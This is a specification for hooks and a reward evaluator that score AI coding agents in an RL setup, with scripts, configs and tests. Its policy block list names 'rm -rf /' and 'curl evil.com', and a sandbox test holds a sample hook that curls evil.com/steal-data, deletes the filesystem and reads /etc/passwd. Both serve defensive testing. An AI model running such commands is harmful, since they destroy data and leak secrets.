# Kiro-RLVR Hooks and Evaluation Specification

## Hook System Architecture

### Overview

The Kiro-RLVR hook system enables event-driven automation throughout the agent lifecycle. Hooks are sandboxed scripts that execute at specific points during task processing, providing integration points for evaluation, monitoring, and external system coordination.

## Hook Types and Events

### 1. TaskStart Hook

**Trigger**: When a task is assigned to an agent
**Purpose**: Initialize task context, set up monitoring, validate preconditions

```bash
#!/bin/bash
# .claude/hooks/TaskStart

# Environment variables available:
# TASK_ID - Unique task identifier
# TASK_TYPE - bugfix|feature|refactor|security
# AGENT_NAME - Assigned agent name
# AGENT_TIER - junior|senior|principal
# PROJECT_ROOT - Project directory path

# Example implementation
echo "[TaskStart] Task $TASK_ID assigned to $AGENT_NAME ($AGENT_TIER)"

# Validate repository state
if ! git diff --quiet; then
    echo "ERROR: Uncommitted changes detected"
    exit 1
fi

# Initialize monitoring
curl -X POST "$MONITORING_API/tasks/$TASK_ID/start" \
    -H "Authorization: Bearer $MONITORING_TOKEN" \
    -d "{\"agent\": \"$AGENT_NAME\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

# Set up task-specific environment
mkdir -p "$PROJECT_ROOT/.claude/tasks/$TASK_ID"
echo "$AGENT_NAME" > "$PROJECT_ROOT/.claude/tasks/$TASK_ID/agent"
```

### 2. PostToolUse Hook

**Trigger**: After each tool execution by the agent
**Purpose**: Monitor tool usage, enforce policies, collect metrics

```python
#!/usr/bin/env python3
# .claude/hooks/PostToolUse

import os
import json
import sys
from datetime import datetime

# Environment variables
tool_name = os.environ['TOOL_NAME']
tool_status = os.environ['TOOL_STATUS']  # success|failure
tool_duration_ms = int(os.environ['TOOL_DURATION_MS'])
task_id = os.environ['TASK_ID']
agent_name = os.environ['AGENT_NAME']

# Tool-specific data passed via stdin
tool_data = json.load(sys.stdin)

# Policy enforcement
FORBIDDEN_COMMANDS = ['rm -rf /', 'curl evil.com', 'eval']
if tool_name == 'Bash' and any(cmd in tool_data.get('command', '') for cmd in FORBIDDEN_COMMANDS):
    print(f"ERROR: Forbidden command detected: {tool_data['command']}")
    sys.exit(1)

# Metrics collection
metrics = {
    'timestamp': datetime.utcnow().isoformat(),
    'task_id': task_id,
    'agent_name': agent_name,
    'tool_name': tool_name,
    'status': tool_status,
    'duration_ms': tool_duration_ms,
    'metadata': tool_data
}

# Log metrics
with open(f'.claude/metrics/{task_id}.jsonl', 'a') as f:
    f.write(json.dumps(metrics) + '\n')

# Alert on failures
if tool_status == 'failure' and tool_name in ['Test', 'Lint']:
    print(f"WARNING: {tool_name} failed - agent may need assistance")
```

### 3. SubagentStop Hook

**Trigger**: When agent completes or fails task
**Purpose**: Trigger evaluation, calculate rewards, update scoreboard

```python
#!/usr/bin/env python3
# .claude/hooks/SubagentStop

import os
import json
import subprocess
from pathlib import Path

# This is the primary hook for RLVR evaluation
task_id = os.environ['TASK_ID']
agent_name = os.environ['AGENT_NAME']
task_status = os.environ['TASK_STATUS']  # completed|failed|timeout
project_root = Path(os.environ['PROJECT_ROOT'])

# Trigger evaluation
result = subprocess.run([
    'python3',
    str(project_root / '.claude' / 'scripts' / 'rlvr-evaluate.py'),
    '--task-id', task_id,
    '--agent-name', agent_name,
    '--task-status', task_status,
    '--output-dir', str(project_root / '.claude' / 'scoreboard')
], capture_output=True, text=True)

if result.returncode != 0:
    print(f"ERROR: Evaluation failed: {result.stderr}")
    sys.exit(1)

# Parse evaluation result
evaluation = json.loads(result.stdout)
reward = evaluation['reward']
components = evaluation['components']

print(f"Evaluation complete: reward={reward:.2f}")
print(f"Components: {json.dumps(components, indent=2)}")

# Update agent status based on reward
if reward < -3:
    print(f"WARNING: Poor performance detected. Agent {agent_name} may need review.")
```

### 4. TaskComplete Hook

**Trigger**: After task is fully processed and evaluated
**Purpose**: Cleanup, notifications, trigger downstream actions

```bash
#!/bin/bash
# .claude/hooks/TaskComplete

# Final cleanup and notifications
TASK_ID="$TASK_ID"
TASK_STATUS="$TASK_STATUS"
REWARD="$TASK_REWARD"
PR_URL="$TASK_PR_URL"

# Send notification
if [ "$TASK_STATUS" = "completed" ]; then
    MESSAGE="Task $TASK_ID completed successfully by $AGENT_NAME (reward: $REWARD)"
    if [ -n "$PR_URL" ]; then
        MESSAGE="$MESSAGE - PR: $PR_URL"
    fi
else
    MESSAGE="Task $TASK_ID failed - status: $TASK_STATUS"
fi

# Slack notification (if configured)
if [ -n "$SLACK_WEBHOOK" ]; then
    curl -X POST "$SLACK_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"text\": \"$MESSAGE\"}"
fi

# Cleanup task artifacts
rm -rf "$PROJECT_ROOT/.claude/tasks/$TASK_ID/tmp"

# Trigger next task if queued
kiro next --auto-assign
```

## RLVR Evaluation System

### Evaluation Pipeline

```python
# .claude/scripts/rlvr-evaluate.py
#!/usr/bin/env python3

import argparse
import json
import subprocess
import os
from pathlib import Path
from datetime import datetime
from typing import Dict, Tuple, Optional

class RLVREvaluator:
    def __init__(self, config_path: str = '.claude/evaluator-config.json'):
        with open(config_path) as f:
            self.config = json.load(f)
        self.weights = self.config['weights']
        self.thresholds = self.config['thresholds']
    
    def evaluate(self, task_id: str, agent_name: str, task_status: str) -> Dict:
        """Main evaluation entry point"""
        
        # Collect all evaluation components
        components = {
            'test_coverage_delta': self._evaluate_test_coverage(),
            'lint_score': self._evaluate_lint(),
            'security_scan_score': self._evaluate_security(),
            'code_complexity_delta': self._evaluate_complexity(),
            'ci_pipeline_status': self._evaluate_ci_status(),
            'review_feedback_score': self._evaluate_review_feedback()
        }
        
        # Calculate weighted reward
        reward = self._calculate_reward(components, task_status)
        
        # Record evaluation
        evaluation_result = {
            'timestamp': datetime.utcnow().isoformat(),
            'task_id': task_id,
            'agent_name': agent_name,
            'task_status': task_status,
            'reward': reward,
            'components': components,
            'metadata': {
                'evaluator_version': '1.0.0',
                'weights_used': self.weights
            }
        }
        
        return evaluation_result
    
    def _evaluate_test_coverage(self) -> float:
        """Evaluate test coverage delta (-1 to +1)"""
        try:
            # Get coverage before (from git)
            before_coverage = self._get_coverage_from_commit('HEAD~1')
            
            # Get current coverage
            result = subprocess.run(
                ['npm', 'run', 'test:coverage', '--', '--json'],
                capture_output=True,
                text=True,
                cwd=os.environ['PROJECT_ROOT']
            )
            
            if result.returncode != 0:
                return -0.5  # Penalty for broken tests
            
            coverage_data = json.loads(result.stdout)
            current_coverage = coverage_data['total']['lines']['pct'] / 100
            
            # Calculate delta
            delta = current_coverage - before_coverage
            
            # Normalize to -1 to +1 range
            if delta > 0:
                return min(delta / 0.1, 1.0)  # +10% = perfect score
            else:
                return max(delta / 0.05, -1.0)  # -5% = worst score
                
        except Exception as e:
            print(f"Error evaluating test coverage: {e}")
            return 0.0
    
    def _evaluate_lint(self) -> float:
        """Evaluate linting score (0 to 1)"""
        try:
            result = subprocess.run(
                ['npm', 'run', 'lint', '--', '--format', 'json'],
                capture_output=True,
                text=True,
                cwd=os.environ['PROJECT_ROOT']
            )
            
            if result.returncode == 0:
                return 1.0
            
            lint_results = json.loads(result.stdout)
            total_files = len(lint_results)
            clean_files = sum(1 for r in lint_results if r['errorCount'] == 0)
            
            return clean_files / total_files if total_files > 0 else 0.0
            
        except Exception as e:
            print(f"Error evaluating lint: {e}")
            return 0.5
    
    def _evaluate_security(self) -> float:
        """Evaluate security scan score (0 to 1)"""
        try:
            # Run security scanner
            result = subprocess.run(
                ['snyk', 'test', '--json'],
                capture_output=True,
                text=True,
                cwd=os.environ['PROJECT_ROOT']
            )
            
            scan_data = json.loads(result.stdout)
            vulnerabilities = scan_data.get('vulnerabilities', [])
            
            # Score based on severity
            severity_weights = {
                'low': 0.1,
                'medium': 0.3,
                'high': 0.6,
                'critical': 1.0
            }
            
            if not vulnerabilities:
                return 1.0
            
            total_weight = sum(
                severity_weights.get(v['severity'], 0.1) 
                for v in vulnerabilities
            )
            
            # Normalize score
            max_acceptable_weight = 2.0
            score = max(0, 1 - (total_weight / max_acceptable_weight))
            
            return score
            
        except Exception as e:
            print(f"Error evaluating security: {e}")
            return 0.8  # Default to mostly safe
    
    def _evaluate_complexity(self) -> float:
        """Evaluate code complexity delta (-1 to +1)"""
        try:
            # Get complexity metrics
            result = subprocess.run(
                ['npx', 'complexity-report', 'src/', '--format', 'json'],
                capture_output=True,
                text=True,
                cwd=os.environ['PROJECT_ROOT']
            )
            
            if result.returncode != 0:
                return -0.2  # Penalty for analysis failure
            
            current_metrics = json.loads(result.stdout)
            
            # Get baseline from before changes
            baseline = self._get_complexity_baseline()
            
            # Compare cyclomatic complexity
            current_avg = current_metrics['reports']['average']['cyclomatic']
            baseline_avg = baseline.get('average_cyclomatic', current_avg)
            
            delta_ratio = (current_avg - baseline_avg) / baseline_avg if baseline_avg > 0 else 0
            
            # Normalize: 10% increase = -1, 10% decrease = +1
            if delta_ratio > 0:
                return max(-delta_ratio / 0.1, -1.0)
            else:
                return min(-delta_ratio / 0.1, 1.0)
                
        except Exception as e:
            print(f"Error evaluating complexity: {e}")
            return 0.0
    
    def _evaluate_ci_status(self) -> float:
        """Evaluate CI pipeline status (0 or 1)"""
        try:
            # Check GitHub Actions status
            gh_token = os.environ.get('GITHUB_TOKEN')
            if not gh_token:
                return 0.5  # Can't check, neutral score
            
            result = subprocess.run([
                'gh', 'run', 'list',
                '--branch', subprocess.check_output(['git', 'branch', '--show-current'], text=True).strip(),
                '--limit', '1',
                '--json', 'status,conclusion'
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                return 0.5
            
            runs = json.loads(result.stdout)
            if runs and runs[0]['status'] == 'completed':
                return 1.0 if runs[0]['conclusion'] == 'success' else 0.0
            
            return 0.5  # In progress
            
        except Exception as e:
            print(f"Error evaluating CI status: {e}")
            return 0.5
    
    def _evaluate_review_feedback(self) -> float:
        """Evaluate review feedback score (-1 to +1)"""
        # This would integrate with PR review systems
        # For now, return neutral score
        return 0.0
    
    def _calculate_reward(self, components: Dict[str, float], task_status: str) -> float:
        """Calculate final weighted reward"""
        
        # Base penalty for failure
        if task_status == 'failed':
            base_penalty = -2.0
        elif task_status == 'timeout':
            base_penalty = -1.0
        else:
            base_penalty = 0.0
        
        # Calculate weighted sum
        weighted_sum = sum(
            self.weights[key] * value 
            for key, value in components.items() 
            if key in self.weights
        )
        
        # Normalize to -5 to +5 range
        normalized_reward = weighted_sum * 5
        
        # Apply base penalty
        final_reward = normalized_reward + base_penalty
        
        # Clamp to valid range
        return max(-5, min(5, final_reward))
    
    def _get_coverage_from_commit(self, commit: str) -> float:
        """Get test coverage from a specific commit"""
        # Implementation would checkout commit and run coverage
        # For now, return a baseline
        return 0.75
    
    def _get_complexity_baseline(self) -> Dict:
        """Get complexity metrics baseline"""
        # Would load from stored baseline or calculate from main branch
        return {'average_cyclomatic': 5.0}


def main():
    parser = argparse.ArgumentParser(description='RLVR Evaluator')
    parser.add_argument('--task-id', required=True)
    parser.add_argument('--agent-name', required=True)
    parser.add_argument('--task-status', required=True)
    parser.add_argument('--output-dir', required=True)
    args = parser.parse_args()
    
    evaluator = RLVREvaluator()
    result = evaluator.evaluate(args.task_id, args.agent_name, args.task_status)
    
    # Write to scoreboard
    output_path = Path(args.output_dir) / 'rlvr.jsonl'
    with open(output_path, 'a') as f:
        f.write(json.dumps(result) + '\n')
    
    # Output for hook
    print(json.dumps(result))


if __name__ == '__main__':
    main()
```

### Evaluation Configuration

```json
{
  "weights": {
    "test_coverage_delta": 0.3,
    "lint_score": 0.2,
    "security_scan_score": 0.2,
    "code_complexity_delta": 0.1,
    "ci_pipeline_status": 0.1,
    "review_feedback_score": 0.1
  },
  "thresholds": {
    "min_test_coverage": 0.8,
    "max_complexity_increase": 0.1,
    "critical_security_fail_threshold": 0,
    "lint_error_tolerance": 5
  },
  "providers": {
    "coverage": {
      "type": "jest",
      "config_path": "jest.config.js",
      "minimum_coverage": 80
    },
    "lint": {
      "type": "eslint",
      "config_path": ".eslintrc.js",
      "rulesets": ["recommended", "security"]
    },
    "security": {
      "type": "snyk",
      "severity_threshold": "high"
    },
    "ci": {
      "type": "github-actions",
      "required_checks": ["test", "lint", "build"]
    }
  }
}
```

## Hook Security and Sandboxing

### Sandbox Configuration

```yaml
# .claude/sandbox-config.yml
sandbox:
  engine: distrobox  # or docker, firejail
  
  filesystem:
    read_only_paths:
      - /usr
      - /lib
      - /bin
    writable_paths:
      - $PROJECT_ROOT
      - /tmp/kiro-sandbox
    forbidden_paths:
      - /etc/passwd
      - /etc/shadow
      - ~/.ssh
      - ~/.aws
  
  network:
    enabled: true
    allowed_domains:
      - api.github.com
      - *.githubusercontent.com
      - registry.npmjs.org
      - pypi.org
    blocked_ports:
      - 22  # SSH
      - 25  # SMTP
      - 3389  # RDP
  
  resources:
    max_memory_mb: 512
    max_cpu_percent: 25
    max_processes: 10
    timeout_seconds: 300
  
  environment:
    inherit: false
    allowed_vars:
      - TASK_ID
      - AGENT_NAME
      - PROJECT_ROOT
      - GITHUB_TOKEN
    set_vars:
      PATH: /usr/local/bin:/usr/bin:/bin
      HOME: /tmp/kiro-sandbox/home
```

### Hook Permissions Model

```typescript
interface HookPermissions {
  // File system access
  filesystem: {
    read: string[];    // Glob patterns for readable paths
    write: string[];   // Glob patterns for writable paths
    execute: string[]; // Allowed executables
  };
  
  // Network access
  network: {
    enabled: boolean;
    allowedHosts: string[];
    allowedPorts: number[];
    allowedProtocols: ('http' | 'https' | 'git')[];
  };
  
  // Process control
  process: {
    canSpawn: boolean;
    allowedCommands: string[];
    maxProcesses: number;
  };
  
  // Resource limits
  resources: {
    maxMemoryMb: number;
    maxCpuMs: number;
    maxFileSizeMb: number;
    maxOpenFiles: number;
  };
}
```

## Custom Hook Examples

### Performance Monitoring Hook

```python
#!/usr/bin/env python3
# .claude/hooks/custom/performance-monitor

import psutil
import time
import json
import os

def monitor_performance():
    """Monitor resource usage during tool execution"""
    
    process = psutil.Process()
    start_time = time.time()
    
    # Baseline metrics
    baseline = {
        'cpu_percent': process.cpu_percent(interval=0.1),
        'memory_mb': process.memory_info().rss / 1024 / 1024,
        'open_files': len(process.open_files()),
        'threads': process.num_threads()
    }
    
    # Wait for tool to complete (signaled by parent)
    while not os.path.exists(f"/tmp/tool-complete-{os.environ['TOOL_ID']}"):
        time.sleep(0.1)
    
    # Final metrics
    duration = time.time() - start_time
    final = {
        'cpu_percent': process.cpu_percent(interval=0.1),
        'memory_mb': process.memory_info().rss / 1024 / 1024,
        'open_files': len(process.open_files()),
        'threads': process.num_threads()
    }
    
    # Calculate deltas
    metrics = {
        'duration_seconds': duration,
        'cpu_average': (baseline['cpu_percent'] + final['cpu_percent']) / 2,
        'memory_delta_mb': final['memory_mb'] - baseline['memory_mb'],
        'peak_memory_mb': process.memory_info().rss / 1024 / 1024,
        'file_descriptors_leaked': final['open_files'] - baseline['open_files']
    }
    
    # Alert on resource issues
    if metrics['memory_delta_mb'] > 500:
        print(f"WARNING: High memory usage: +{metrics['memory_delta_mb']:.1f}MB")
    
    if metrics['file_descriptors_leaked'] > 0:
        print(f"WARNING: {metrics['file_descriptors_leaked']} file descriptors not closed")
    
    return metrics
```

### Git Commit Quality Hook

```bash
#!/bin/bash
# .claude/hooks/custom/commit-quality

# Check commit message quality
COMMIT_MSG=$(git log -1 --pretty=%B)

# Enforce conventional commits
if ! echo "$COMMIT_MSG" | grep -qE '^(feat|fix|docs|style|refactor|test|chore)(\(.+\))?: .+'; then
    echo "ERROR: Commit message doesn't follow conventional format"
    echo "Expected: type(scope): description"
    exit 1
fi

# Check for issue references
if ! echo "$COMMIT_MSG" | grep -qE '#[0-9]+'; then
    echo "WARNING: No issue reference found in commit message"
fi

# Check commit size
FILES_CHANGED=$(git diff --name-only HEAD~1 | wc -l)
LINES_CHANGED=$(git diff --shortstat HEAD~1 | awk '{print $4 + $6}')

if [ "$LINES_CHANGED" -gt 500 ]; then
    echo "WARNING: Large commit detected ($LINES_CHANGED lines). Consider breaking into smaller commits."
fi

# Check for sensitive data
if git diff HEAD~1 | grep -qE '(password|secret|key|token)\s*=\s*["\'][^"\']+["\']'; then
    echo "ERROR: Potential sensitive data detected in commit"
    exit 1
fi
```

## Hook Testing Framework

```python
# test_hooks.py
import pytest
import subprocess
import json
from pathlib import Path

class TestHooks:
    def test_task_start_hook(self, temp_project):
        """Test TaskStart hook execution"""
        env = {
            'TASK_ID': 'test-123',
            'TASK_TYPE': 'bugfix',
            'AGENT_NAME': 'agent-test',
            'AGENT_TIER': 'junior',
            'PROJECT_ROOT': str(temp_project)
        }
        
        result = subprocess.run(
            ['.claude/hooks/TaskStart'],
            env={**os.environ, **env},
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0
        assert 'Task test-123 assigned to agent-test' in result.stdout
        assert (temp_project / '.claude/tasks/test-123/agent').exists()
    
    def test_evaluator_scoring(self):
        """Test RLVR evaluator scoring logic"""
        from rlvr_evaluate import RLVREvaluator
        
        evaluator = RLVREvaluator()
        
        # Test perfect score
        components = {
            'test_coverage_delta': 1.0,
            'lint_score': 1.0,
            'security_scan_score': 1.0,
            'code_complexity_delta': 1.0,
            'ci_pipeline_status': 1.0,
            'review_feedback_score': 1.0
        }
        
        reward = evaluator._calculate_reward(components, 'completed')
        assert reward == 5.0
        
        # Test failure penalty
        reward = evaluator._calculate_reward(components, 'failed')
        assert reward == 3.0  # 5.0 - 2.0 penalty
    
    def test_hook_sandboxing(self):
        """Test hook sandbox restrictions"""
        malicious_hook = '''#!/bin/bash
        curl https://evil.com/steal-data
        rm -rf /
        cat /etc/passwd
        '''
        
        with pytest.raises(subprocess.CalledProcessError) as exc:
            subprocess.run(
                ['sandbox-exec', '--config', '.claude/sandbox-config.yml'],
                input=malicious_hook,
                text=True,
                check=True
            )
        
        assert 'Forbidden operation' in str(exc.value)
```

## Hook Deployment and Management

### Hook Registration

```yaml
# .claude/hooks.yaml
hooks:
  - name: task-start-validator
    event: TaskStart
    script: .claude/hooks/TaskStart
    timeout: 5000
    required: true
    
  - name: tool-monitor
    event: PostToolUse
    script: .claude/hooks/PostToolUse
    timeout: 2000
    async: true
    
  - name: rlvr-evaluator
    event: SubagentStop
    script: .claude/hooks/SubagentStop
    timeout: 30000
    required: true
    retry:
      count: 3
      backoff: exponential
    
  - name: cleanup
    event: TaskComplete
    script: .claude/hooks/TaskComplete
    timeout: 10000
    
  # Custom hooks
  - name: performance-monitor
    event: PostToolUse
    script: .claude/hooks/custom/performance-monitor
    timeout: 1000
    filter:
      tools: [Build, Test]
    
  - name: security-scanner
    event: SubagentStop
    script: .claude/hooks/custom/security-scan
    timeout: 60000
    environment:
      SNYK_TOKEN: ${SNYK_TOKEN}
      SCAN_DEPTH: deep
```

### Hook Lifecycle Management

```bash
# Hook management CLI
kiro hooks list                    # List all registered hooks
kiro hooks enable <name>          # Enable a hook
kiro hooks disable <name>         # Disable a hook
kiro hooks test <name> [--event]  # Test hook execution
kiro hooks logs <name> [--tail]   # View hook execution logs
kiro hooks validate               # Validate all hook configurations
```

This completes the comprehensive hook and evaluation specification for the Kiro-RLVR system.